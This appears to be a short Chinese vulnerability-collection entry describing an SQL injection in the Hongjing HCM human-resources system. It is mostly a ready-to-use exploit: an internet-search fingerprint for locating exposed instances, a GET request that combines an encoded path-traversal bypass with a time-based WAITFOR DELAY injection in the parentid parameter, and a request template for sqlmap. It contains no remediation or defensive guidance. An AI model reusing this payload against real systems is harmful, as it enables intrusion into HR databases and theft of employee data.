# 宏景人力资源信息管理系统loadhistroyorgtree存在SQL注入漏洞

- **系统**：宏景人力资源信息管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="宏景 HCM"`
- **请求**：`GET /w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree?isroot=child&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&kind=2&catalog_id=11&issuperuser=111&manageprive=111&action=111&target= HTTP/1.1`
- **关键头**：`Host: {hostname}`

**请求体 / payload**
```

sqlmap
GET /w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree?isroot=child&parentid=1&kind=2&catalog_id=11&issuperuser=111&manageprive=111&action=111&target= HTTP/1.1
Host: {hostname}
```

**其他**
- 宏景人力资源信息管理系统loadhistroyorgtree存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 宏景人力资源信息管理系统